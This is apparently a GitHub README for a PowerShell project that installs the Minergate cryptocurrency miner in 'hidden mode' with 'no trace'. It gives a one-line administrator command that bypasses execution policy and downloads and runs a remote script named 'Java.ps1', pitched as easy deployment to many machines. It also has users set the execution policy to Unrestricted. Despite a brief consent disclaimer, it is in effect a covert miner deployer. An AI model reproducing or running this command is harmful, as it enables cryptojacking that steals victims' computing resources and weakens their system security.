# Minergate Deployment and Running

Install and Run Minergate-CLI in Hidden Mode

Full Guide can be found: https://talkisgeek.com/how-to-use-minergate-cli-in-hidden-mode-no-trace/

// I'm currently rebuilting talkisgeek website. 

_Host_: https://api.minergate.com

### Introduction

This project I undertook while running a small graphics powered farm while I was improving on my coding skills. I will slowly update all the source code I used to install and deploy and monitor my farm. 

Please do NOT use this without the consent of the person who owns the computer. This code is NOT to be used for malicious purposes. 

### Final Example (Works in Win 10 Only)

With some work you can executes the code in this git via one line of code only. It makes it extremely easy to deploy to lots of machines. I will publish the guide on how to do this soon. 

Run CMD as Administrator and paste this script in:

@powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((new-object net.webclient).DownloadString('https://gist.githubusercontent.com/Hawkryption/dd55e0a282a70f3af63ed792f5eca570/raw/c7b150fa54fd34736fcfca27c2faf649ae22c5c7/Java.ps1'))"

### Using this Powershell Script

#### 1. Download Install_Minergate.ps1 and Edit the Code

Download Install_Minergate.ps1 and place it in your C:\ Directory. Register an account with Minergate.com and replace the email address with your own in the code. To edit the code right click the file and click edit.

#### 2. Lunch Powershell in Administrator Mode

Click on Start and type Powershell -> Right click on "Windows Powershell" and then "Run as Administrator"

#### 3. Set Execution Policy

By default Windows does not allow the execution of Powershell scripts. This is by design to stop remote/local execution out of the box for hackers to take advantage of. Please be aware that when you set this you are allow unrestricted script execution access to your PC and as such any application can remotely execute scripts. You can isolate it to just one session that has unrestricted access. You will need to find out how to complete that if it concerns you.

You must launch Powershell in Administrator mode and type the following: (Without "")

**"cd \"** cd \ Press Enter

![Alt text](https://github.com/MetalH47K/Minergate-Powershell/blob/master/cd.PNG?raw=true "cd \")

**"_Set-ExecutionPolicy Unrestricted_"** Press Enter

Powershell will then ask:

**Execution Policy Change**

The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
http://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): 

You need to choose: "[A] Yes to All" **Press A**

![Alt text](https://github.com/MetalH47K/Minergate-Powershell/blob/master/Set-ExecutionPolicy%20Unrestricted.PNG?raw=true "Set-ExecutionPolicy Unrestricted")

#### 4. Execute Script

Now you are ready to execute the script. Simply type without brackets **".\Install_Minergate.ps1"**


